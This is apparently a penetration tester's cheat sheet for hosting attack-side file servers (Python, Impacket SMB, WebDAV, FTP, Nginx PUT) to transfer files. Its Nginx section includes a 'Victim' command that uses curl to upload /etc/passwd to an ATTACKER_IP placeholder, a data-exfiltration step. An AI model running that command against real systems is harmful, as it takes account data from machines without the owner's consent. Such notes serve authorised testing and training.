# Hosting Servers
```table-of-contents
```
## Python HTTP Server
```shell
# Python 3
sudo python3 -m http.server 80

# Python 2
sudo python2 -m SimpleHTTPServer 80
```
## Python Upload Server
### Encrypted HTTPS (Stealthier)
```shell
# 1. Generate Self-Signed Certificate
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'

# 2. Start Server with Cert
python3 -m uploadserver 443 --server-certificate server.pem
```
### Basic HTTP
```shell
# Python 3
sudo python3 -m http.server 80

# Python 2
sudo python2 -m SimpleHTTPServer 80
```
## Simple Web Servers (Download Only)
```shell
# Python 3
python3 -m http.server 80

# Python 2
python2 -m SimpleHTTPServer 80

# PHP
php -S 0.0.0.0:80

# Ruby
ruby -run -e httpd . -p 80
```
## SMB Server (Impacket)
```shell
# Anonymous Share
# Share name: 'share' | Path: Current dir (.)
sudo impacket-smbserver share . -smb2support

# Authenticated Share (Use if anonymous is blocked)
sudo impacket-smbserver share . -smb2support -username test -password test
```
## WebDAV Server (Python)
```shell
# Install
pip3 install wsgidav cheroot

# Start Server (Anonymous, Root=/tmp)
wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
```
## FTP Server (Python)
```shell
# Install
pip3 install pyftpdlib

# Start Server (Port 21, Allow Write)
sudo python3 -m pyftpdlib --port 21 --write
```
## Nginx - Enabling PUT
### 1. Server Configuration (Attacker)
```shell
# 1. Create a directory to handle uploaded files
sudo mkdir -p /var/www/uploads/SecretUploadDirectory

# 2. Change the owner to www-data (Nginx user)
sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory
```
### 2. Nginx Config File
_Create `/etc/nginx/sites-available/upload.conf` with the following content:_
```txt
server {
    listen 9001;
    
    location /SecretUploadDirectory/ {
        root    /var/www/uploads;
        dav_methods PUT;
    }
}
```
### 3. Enable & Start
```shell
# 1. Symlink to sites-enabled
sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/

# 2. Remove default config (Optional: if Port 80 is conflicting)
sudo rm /etc/nginx/sites-enabled/default

# 3. Start Nginx
sudo systemctl restart nginx.service
```
### 4. Client Upload Command (Victim)
```shell
# Upload /etc/passwd to your server
curl -T /etc/passwd http://<ATTACKER_IP>:9001/SecretUploadDirectory/users.txt
```
### Troubleshooting (Port Conflicts)
```shell
# Check logs
tail -2 /var/log/nginx/error.log
# Error: bind() to 0.0.0.0:80 failed (Address already in use)

# Check who is using Port 80
ss -lnpt | grep 80

# Fix: Remove the default Nginx config which binds to Port 80
sudo rm /etc/nginx/sites-enabled/default
sudo systemctl restart nginx.service
```